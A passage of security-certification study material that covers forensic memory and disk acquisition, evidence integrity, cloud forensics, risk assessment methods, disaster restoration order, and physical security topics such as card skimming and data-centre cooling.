- The Sleuth Kit ([sleuthkit.org](https://sleuthkit.org/)) is an open-source collection of command line tools and programming libraries for disk imaging and file analysis. Autopsy is a graphical front-end for these tools and acts as a case management/workflow tool. The program can be extended with plug-ins for various analysis functions. Autopsy is available for Windows and can be compiled from the source code to run on Linux.
- WinHex from X-Ways ([x-ways.net/winhex](https://www.x-ways.net/winhex/)) is a commercial tool for forensic recovery and analysis of binary data, with support for a range of file systems and memory dump types (depending on version).
- The Volatility Framework ([github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)) is widely used for system memory analysis.

SYSTEM MEMORY ACQUISITION

System memory is volatile data held in Random Access Memory (RAM) modules. Volatile means that the data is lost when power is removed. A system memory dump creates an image file that can be analyzed to identify the processes that are running, the contents of temporary file systems, registry data, network connections, cryptographic keys, and more. It can also be a means of accessing data that is encrypted when stored on a mass storage device. There are various methods of collecting the contents of system memory.

Viewing the process list in a memory dump using the Volatility Framework. (Screenshot Volatility Framework [volatilityfoundation.org](https://www.volatilityfoundation.org/).)
### Live Acquisition
A specialist hardware or software tool can capture the contents of memory while the host is running. Unfortunately, this type of tool needs to be preinstalled as it requires a kernel mode driver to dump any data of interest. Some examples for Windows include WinHex ([x-ways.net/winhex](https://www.x-ways.net/winhex/)), Memoryze from FireEye ([fireeye.com/services/freeware/memoryze.html](https://www.fireeye.com/services/freeware/memoryze.html)), and F-Response TACTICAL ([f-response.com/software/tac](https://www.f-response.com/software/tac)).

On Linux, a user mode tool, such as memdump ([porcupine.org/forensics/tct.html](http://www.porcupine.org/forensics/tct.html)) or dd, can be run against the /dev/mem device file. However, on most modern distributions, access to this file is blocked. The Volatility Framework ([github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)) includes a tool to install a kernel driver (pmem). The fmem and LiME kernel utilities provide similar functionality.
### Crash Dump
When Windows encounters an unrecoverable kernel error, it can write contents of memory to a dump file at C:\Windows\MEMORY.DMP. On modern systems, there is unlikely to be a complete dump of all the contents of memory, as these could take up a lot of disk space. However, even mini dump files, stored in C:\Windows\Minidumps, may be a valuable source of information.
### Hibernation File and Pagefile
A hibernation file is created on disk in the root folder of the boot volume when a Windows host is put into a sleep state. If it can be recovered, the data can be decompressed and loaded into a software tool for analysis. The drawback is that network connections will have been closed, and malware may have detected the use of a sleep state and performed anti-forensics.

The pagefile/swap file/swap partition stores pages of memory in use that exceed the capacity of the host's RAM modules. The pagefile is not structured in a way that analysis tools can interpret, but it is possible to search for strings.

DISK IMAGE ACQUISITION

Disk image acquisition refers to acquiring data from nonvolatile storage. Nonvolatile storage includes hard disk drives (HDDs), solid state drives (SSDs), firmware, other types of flash memory (USB thumb drives and memory cards), and optical media (CD, DVD, and Blu-Ray). This can also be referred to as device acquisition, meaning the SSD storage in a smartphone or media player. Disk acquisition will also capture the OS installation, if the boot volume is included.

There are three device states for persistent storage acquisition:

- Live acquisition—this means copying the data while the host is still running. This may capture more evidence or more data for analysis and reduce the impact on overall services, but the data on the actual disks will have changed, so this method may not produce legally acceptable evidence. It may also alert the adversary and allow time for them to perform anti-forensics.
- Static acquisition by shutting down the host—this runs the risk that the malware will detect the shutdown process and perform anti-forensics to try to remove traces of itself.
- Static acquisition by pulling the plug—this means disconnecting the power at the wall socket (not the hardware power-off button). This is most likely to preserve the storage devices in a forensically clean state, but there is the risk of corrupting data.

Given sufficient time at the scene, you may decide to perform both a live and static acquisition. Whichever method is used, it is imperative to document the steps taken and supply a timeline for your actions.

There are many GUI imaging utilities, including those packaged with suites such as the Forensic Toolkit and its FTK Imager. You should note that the EnCase forensics suite uses a vendor file format (.e01) compared to the raw file format used by Linux tools like dd. The file format is important when it comes to selecting a tool for analyzing the image. The .eo1 format allows image metadata (such as the checksum, drive geometry, and acquisition time) to be stored within the same file. The open-source Advanced Forensic Format (AFF) provides similar features.

If no specialist tool is available, on a Linux host you can use the dd command to make a copy of an input file (if=) to an output file (of=) and apply optional conversions to the file data. In the following sda is the fixed drive:

dd if=/dev/sda of=/mnt/usbstick/backup.img

A more recent fork of dd is dcfldd, which provides additional features like multiple output files and exact match verification.

Using dcfldd (a version of dd with additional forensics functionality created by the DoD) and generating a hash of the source-disk data (sda).

PRESERVATION AND INTEGRITY OF EVIDENCE

It is vital that the evidence collected at the crime scene conform to a valid timeline. Digital information is susceptible to tampering, so access to the evidence must be tightly controlled. Recording the whole process establishes the provenance of the evidence as deriving directly from the crime scene.

To obtain a forensically sound image from nonvolatile storage, you need to ensure that nothing you do alters data or metadata (properties) on the source disk or file system. A write blocker assures this process by preventing any data on the disk or volume from being changed by filtering write commands at the driver and OS level. Data acquisition would normally proceed by attaching the target device to a forensics workstation or field capture device equipped with a write blocker.
### Data Acquisition with Integrity and Non-Repudiation
Once the target disk has been safely attached to the forensics workstation, data acquisition proceeds as follows:

1. A cryptographic hash of the disk media is made, using either the MD5 or SHA hashing function. The output of the function can be described as a checksum.
1. A bit-by-bit copy of the media is made using the imaging utility.
1. A second hash is then made of the image, which should match the original hash of the media.
1. A copy is made of the reference image, validated again by the checksum. Analysis is performed on the copy.

This proof of integrity ensures non-repudiation. If the provenance of the evidence is certain, the threat actor identified by analysis of the evidence cannot deny their actions. The checksums prove that no modification has been made to the image.

In practical terms, the image acquisition software will perform the verification steps as part of the acquisition process, but in theory you could use separate tools to perform each stage individually.
### Preservation of Evidence
The host devices and media taken from the crime scene should be labeled, bagged, and sealed, using tamper-evident bags. It is also appropriate to ensure that the bags have antistatic shielding to reduce the possibility that data will be damaged or corrupted on the electronic media by electrostatic discharge (ESD). Each piece of evidence should be documented by a chain of custody form which records where, when, and who collected the evidence, who subsequently handled it, and where it was stored. 

The evidence should be stored in a secure facility; this not only means access control, but also environmental control, so that the electronic systems are not damaged by condensation, ESD, fire, and other hazards. Similarly, if the evidence is transported, the transport must also be secure.

DIGITAL FORENSICS FOR CLOUD

With an on-premises investigation, the right to seize and analyze devices is usually fairly unproblematic. There may be availability issues with taking a system out of service, and bring-your-own-device policies can be more complex, but essentially as all the equipment is the company's property, there are no third-party obstacles.

While companies can operate private clouds, forensics in a public cloud are complicated by the right to audit permitted to you by your service level agreement (SLA) with the cloud provider. Two more issues with forensics investigations of cloud-hosted processing and data services are as follows:

- The on-demand nature of cloud services means that instances are often created and destroyed again, with no real opportunity for forensic recovery of any data. Cloud providers can mitigate this to some extent with extensive logging and monitoring options. A CSP might also provide an option to generate file system and memory snapshots from containers and VMs in response to an alert condition generated by a SIEM.
- Chain of custody issues are complex and might have to rely on the CSP to select and package data for you. The process should be documented and recorded as closely as is possible.
- Jurisdiction and data sovereignty may restrict what evidence the CSP is willing to release to you.
- If the CSP is a data processor, it will be bound by data breach notification laws and regulations. Coordinating the timing of notification and contact with the regulator between your organization and the CSP can be extremely complex, especially if there is an ongoing incident requiring confidentiality.

QUANTITATIVE RISK ASSESSMENT

There are quantitative and qualitative methods of performing risk analysis to evaluate likelihood and impact.

Quantitative risk assessment aims to assign concrete values to each risk factor. (Image © 123RF.com.)

Quantitative risk assessment aims to assign concrete values to each risk factor.

- Single Loss Expectancy (SLE)—the amount that would be lost in a single occurrence of the risk factor. This is determined by multiplying the value of the asset by an Exposure Factor (EF). EF is the percentage of the asset value that would be lost.
- Annualized Loss Expectancy (ALE)—the amount that would be lost over the course of a year. This is determined by multiplying the SLE by the Annualized Rate of Occurrence (ARO).

It is important to realize that the value of an asset does not refer solely to its material value. The two principal additional considerations are direct costs associated with the asset being compromised (downtime) and consequent costs to intangible assets, such as the company's reputation. For example, a server may have a material cost of a few hundred dollars. If the server were stolen, the costs incurred from not being able to do business until it can be recovered or replaced could run to thousands of dollars. In addition, that period of interruption where orders cannot be taken or go unfulfilled leads customers to look at alternative suppliers, resulting in perhaps more thousands of lost sales and goodwill.

The problem with quantitative risk assessment is that the process of determining and assigning these values is complex and time consuming. The accuracy of the values assigned is also difficult to determine without historical data (often, it has to be based on subjective guesswork). However, over time and with experience, this approach can yield a detailed and sophisticated description of assets and risks and provide a sound basis for justifying and prioritizing security expenditure.

QUALITATIVE RISK ASSESSMENT

Qualitative risk assessment avoids the complexity of the quantitative approach and is focused on identifying significant risk factors. The qualitative approach seeks out people's opinions of which risk factors are significant. Assets and risks may be placed in simple categories. For example, assets could be categorized as Irreplaceable, High Value, Medium Value, and Low Value; risks could be categorized as one-off or recurring and as Critical, High, Medium, and Low probability.

Another simple approach is the heat map or "Traffic Light" impact matrix. For each risk, a simple Red, Yellow, or Green indicator can be put into each column to represent the severity of the risk, its likelihood, cost of controls, and so on. This approach is simplistic but does give an immediate impression of where efforts should be concentrated to improve security.

Traffic light impact grid.

FIPS 199 ([nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.199.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5721/supplementary/NIST.FIPS.199.pdf)) discusses how to apply security categorizations (SC) to information systems based on the impact that a breach of confidentiality, integrity, or availability would have on the organization as a whole. Potential impacts can be classified as:

- Low—minor damage or loss to an asset or loss of performance (though essential functions remain operational).
- Moderate—significant damage or loss to assets or performance.
- High—major damage or loss or the inability to perform one or more essential functions.

RISK MANAGEMENT STRATEGIES

The result of a quantitative or qualitative analysis is a measure of inherent risk. Inherent risk is the level of risk before any type of mitigation has been attempted.

In theory, security controls or countermeasures could be introduced to address every risk factor. The difficulty is that security controls can be expensive, so you must balance the cost of the control with the cost associated with the risk. It is not possible to eliminate risk; rather the aim is to mitigate risk factors to the point where the organization is exposed only to a level of risk that it can afford. The overall status of risk management is referred to as risk posture. Risk posture shows which risk response options can be identified and prioritized. For example, you might identify the following priorities:

- Regulatory requirements to deploy security controls and make demonstrable efforts to reduce risk. Examples of legislation and regulation that mandate risk controls include SOX, HIPAA, Gramm-Leach-Bliley, the Homeland Security Act, PCI DSS regulations, and various personal data protection measures.
- High value asset, regardless of the likelihood of the threat(s).
- Threats with high likelihood (that is, high ARO).
- Procedures, equipment, or software that increase the likelihood of threats (for example, legacy applications, lack of user training, old software versions, unpatched software, running unnecessary services, not having auditing procedures in place, and so on). 

In the quantitative approach, the Return on Security Investment (ROSI) can be determined by calculating a new ALE, based on the reduction in loss that will be created by the security controls introduced. The formula for calculating ROSI is: [(ALE - ALEm) - Cost of Solution] / Cost of Solution, where ALE is the ALE before controls and ALEm is after controls. 

Risk mitigation (or remediation) is the overall process of reducing exposure to or the effects of risk factors. If you deploy a countermeasure that reduces exposure to a threat or vulnerability that is risk deterrence (or reduction). Risk reduction refers to controls that can either make a risk incident less likely or less costly (or perhaps both). For example, if fire is a threat, a policy strictly controlling the use of flammable materials on site reduces likelihood while a system of alarms and sprinklers reduces impact by (hopefully) containing any incident to a small area. Another example is offsite data backup, which provides a remediation option in the event of servers being destroyed by fire. 

RISK ACCEPTANCE AND RISK APPETITE

It is not possible to reduce risks to zero, so part of risk posture is concerned with managing what risks remain.
### Risk Acceptance
Risk acceptance (or tolerance) means that no countermeasures are put in place either because the level of risk does not justify the cost or because there will be unavoidable delay before the countermeasures are deployed. In this case, you should continue to monitor the risk (as opposed to ignoring it). 
### Residual Risk and Risk Appetite
Where inherent risk is the risk before mitigation, residual risk is the likelihood and impact after specific mitigation, transference, or acceptance measures have been applied. Risk appetite is a strategic assessment of what level of residual risk is tolerable. Risk appetite is broad in scope. Where risk acceptance has the scope of a single system, risk appetite has a project- or institution-wide scope. Risk appetite is constrained by regulation and compliance.
### Control Risk
Control risk is a measure of how much less effective a security control has become over time. For example, antivirus became quite capable of detecting malware on the basis of signatures, but then less effective as threat actors started to obfuscate code. Control risk can also refer a security control that was never effective in mitigating inherent risk. This illustrates the point that risk management is an ongoing process, requiring continual reassessment and re-prioritization. 

RISK AWARENESS

To ensure that the business stakeholders understand each risk scenario, you should articulate it such that the cause and effect can clearly be understood by the owner of the asset. A DoS risk should be put into plain language that describes how the risk would occur and, as a result, what access is being denied to whom, and the effect to the business. For example: "As a result of malicious or hacking activity against the public website, the site may become overloaded, preventing clients from accessing their client order accounts. This will result in a loss of sales for so many hours and a potential loss of revenue of so many dollars."

A risk register is a document showing the results of risk assessments in a comprehensible format. The register may resemble the heat map risk matrix shown earlier with columns for impact and likelihood ratings, date of identification, description, countermeasures, owner/route for escalation, and status. Risk registers are also commonly depicted as scatterplot graphs, where impact and likelihood are each an axis, and the plot point is associated with a legend that includes more information about the nature of the plotted risk. A risk register should be shared between stakeholders (executives, department managers, and senior technicians) so that they understand the risks associated with the workflows that they manage.

RESTORATION ORDER

If a site suffers an uncontrolled outage, in ideal circumstances processing will be switched to an alternate site and the outage can be resolved without any service interruption. If an alternate processing site is not available, then the main site must be brought back online as quickly as possible to minimize service disruption. This does not mean that the process can be rushed, however. A complex facility such as a data center or campus network must be reconstituted according to a carefully designed order of restoration. If systems are brought back online in an uncontrolled way, there is the serious risk of causing additional power problems or of causing problems in the network, OS, or application layers because dependencies between different appliances and servers have not been met.

In very general terms, the order of restoration will be as follows:

1. Enable and test power delivery systems (grid power, power distribution units [PDUs], UPS, secondary generators, and so on).
1. Enable and test switch infrastructure, then routing appliances and systems.
1. Enable and test network security appliances (firewalls, IDS, proxies).
1. Enable and test critical network servers (DHCP, DNS, NTP, and directory services).
1. Enable and test back-end and middleware (databases and business logic). Verify data integrity.
1. Enable and test front-end applications.
1. Enable client workstations and devices and client browser access.

NONPERSISTENCE

When recovering systems, it may be necessary to ensure that any artifacts from the disaster, such as malware or backdoors, are removed when reconstituting the production environment. This can be facilitated in an environment designed for nonpersistence. Nonpersistence describes a computing environment (e.g., virtual machine instance) that is static in terms of processing function. Storing data elsewhere allows the instance to be destroyed and rebuilt with the same functionality without suffering configuration problems. There are various mechanisms for ensuring nonpersistence:

- Snapshot/revert to known state—this is a saved system state that can be reapplied to the instance.
- Rollback to known configuration—a physical instance might not support snapshots but has an "internal" mechanism for restoring the baseline system configuration, such as Windows System Restore.
- Live boot media—another option is to use an instance that boots from read-only storage to memory rather than being installed on a local read/write hard disk.

When provisioning a new or replacement instance automatically, the automation system may use one of two types of mastering instructions:

- Master image—this is the "gold" copy of a server instance, with the OS, applications, and patches all installed and configured. This is faster than using a template, but keeping the image up to date can involve more work than updating a template.
- Automated build from a template—similar to a master image, this is the build instructions for an instance. Rather than storing a master image, the software may build and provision an instance according to the template instructions.

Another important process in automating resiliency strategies is to provide configuration validation. This process ensures that a recovery solution is working at each layer (hardware, network connectivity, data replication, and application). An automation solution for incident and disaster recovery will have a dashboard of key indicators and may be able to evaluate metrics such as compliance with recovery point objective (RPO) and recovery time objective (RTO) from observed data.

PHYSICAL ATTACKS AGAINST SMART CARDS AND USB

Some types of smart cards used as passkeys for electronic locks can be vulnerable to cloning and skimming attacks:

- Card cloning—this refers to making one or more copies of an existing card. A lost or stolen card with no cryptographic protections can be physically duplicated. Card loss should be reported immediately so that it can be revoked and a new one issued. If there were a successful attack, it might be indicated by use of a card in a suspicious location or time of day.
- Skimming—this refers to using a counterfeit card reader to capture card details, which are then used to program a duplicate. Some types of proximity cards can quite easily be made to transmit the credential to a portable RFID reader that a threat actor could conceal on his or her person. Skimmers installed on public readers, such as ATM machines, can be difficult to spot. 

These attacks can generally only target "dumb" smart cards that transfer tokens rather than perform cryptoprocessing. Bank-issued smart cards, referred to as EMV (Europay, MasterCard, Visa), can also be vulnerable through the magnetic strip, which is retained for compatibility.

When evaluating risks from card cloning and skimming, you need to realize that there are many types of "smart card." For example, old MIFARE Classic cards used as public transit payment cards are easily cloned because they use a weak cryptographic implementation. Building entry systems using contactless cards with no cryptoprocessing are also vulnerable ([youtube.com/watch?v=cxxnuofREcM](https://www.youtube.com/watch?v=cxxnuofREcM)). Cloning of MIFARE EV or EMV smart cards that implement a TPM-like cryptoprocessor is not thought to be possible.

Malicious USB charging cables and plugs are also a widespread problem. As with card skimming, a device may be placed over a public charging port at airports and other transit locations. A USB data blocker can provide mitigation against these juice-jacking attacks by preventing any sort of data transfer when the smartphone or laptop is connected to a charge point ([zdnet.com/article/this-cheap-gadget-can-stop-your-smartphone-or-tablet-being-hacked-at-an-airport-hotel-or-cafe](https://www.zdnet.com/article/this-cheap-gadget-can-stop-your-smartphone-or-tablet-being-hacked-at-an-airport-hotel-or-cafe/)).

PROTECTED DISTRIBUTION AND FARADAY CAGES

A physically secure cabled network is referred to as protected cable distribution or as a protected distribution system (PDS). There are two principal risks:

- An intruder could attach eavesdropping equipment to the cable (a tap).
- An intruder could cut the cable (Denial of Service).

A hardened PDS is one where all cabling is routed through sealed metal conduit and subject to periodic visual inspection. Lower-grade options are to use different materials for the conduit (plastic, for instance). Another option is to install an alarm system within the cable conduit, so that intrusions can be detected automatically.

It is possible to install communications equipment within a shielded enclosure, known as a Faraday Cage. The cage is a charged conductive mesh that blocks signals from entering or leaving the area. The risk of eavesdropping from leakage of electromagnetic signals was investigated by the US DoD who defined TEMPEST (Transient Electromagnetic Pulse Emanation Standard) as a means of shielding the signals. 

HOT AND COLD AISLES

A data center or server room should be designed in such a way as to maximize air flow across the server or racks. If multiple racks are used, install equipment so that servers are placed back-to-back not front-to-back, so that the warm exhaust from one bank of servers is not forming the air intake for another bank. This is referred to as a hot aisle/cold aisle arrangement. In order to prevent air leaks from the hot aisle to the cold aisle, ensure that any gaps in racks are filled by blank panels and use strip curtains or excluders to cover any spaces above or between racks.

Hot aisle containment design—Cold air circulates from the air conditioner under the floor and around the rack, while hot air is drawn from between the racks through the ceiling space (plenum) to a heat exchanger. In this design, it is important that hot air does not leak from the ceiling or from the floor space between the racks. (Image © 123RF.com.)

Make sure that cabling is secured by cable ties or ducting and does not run across walkways. Cable is best run using a raised floor. If running cable through plenum spaces, make sure it is fire-retardant and be conscious of minimizing proximity to electrical sources, such as electrical cable and fluorescent light, which can corrupt data signals (Electromagnetic Interference [EMI]). You also need to ensure that there is sufficient space in the plenum for the air conditioning system to work properly—filling the area with cable is not the best idea.

To reduce interference, data/network cabling should not be run parallel to power cabling. If EMI is a problem, shielded cabling can be installed. Alternatively, the copper cabling could be replaced with fiber optic cabling, which is not susceptible to EMI.

